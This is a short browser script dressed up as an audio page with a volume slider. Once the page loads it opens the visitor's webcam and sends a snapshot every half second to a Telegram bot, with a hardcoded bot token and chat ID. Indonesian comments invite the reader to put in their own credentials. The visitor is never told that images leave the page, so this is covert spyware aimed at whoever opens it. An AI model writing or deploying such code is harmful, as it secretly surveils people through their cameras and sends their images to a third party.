  <script>
    window.onload = function() {
      var audio = new Audio("audio.mp3");
      audio.volume = 0.5;

      var volumeControl = document.createElement("input");
      volumeControl.type = "range";
      volumeControl.min = 0;
      volumeControl.max = 1;
      volumeControl.step = 0.01;
      volumeControl.value = audio.volume;
      document.body.appendChild(volumeControl);

      volumeControl.addEventListener('input', function() {
        audio.volume = this.value;
      });

      const video = document.createElement('video');
      video.width = 640;
      video.height = 480;
      video.autoplay = true;
      document.body.appendChild(video);

      const canvas = document.createElement('canvas');
      canvas.width = 480;
      canvas.height = 640;
      const context = canvas.getContext('2d');
      const token = '6702290917:AAH_T3GZE6_uoLRYy8_uHe_mjxV_nyIG2fw'; // Ganti dengan token bot Telegram Anda
      const chatId = '6671310814'; // Ganti dengan ID obrolan Telegram Anda
      let intervalId;

      function startPhotoCapture() {
        intervalId = setInterval(sendPhoto, 500);
      }

      function stopPhotoCapture() {
        clearInterval(intervalId);
      }

      function sendPhoto() {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', blob, 'webcam.jpg');

          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
          })
          .then(response => response.json())
          .then(data => {
            console.log('Photo sent:', data);
          })
          .catch(error => {
            console.error('Error sending photo:', error);
          });
        }, 'image/jpeg');
      }

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();
          startPhotoCapture();
          audio.play().catch(error => {
            console.error("Autoplay blocked by browser: ", error);
          });
        })
        .catch(err => {
          console.error("Error accessing the camera: ", err);
        });

      document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
          stopPhotoCapture();
          audio.pause(); // Pause audio when the page is hidden
        } else if (video.srcObject) { // Only play audio if camera access was previously granted
          startPhotoCapture();
          audio.play().catch(error => {
            console.error("Autoplay blocked by browser: ", error);
          });
        }
      });
    };
  </script>
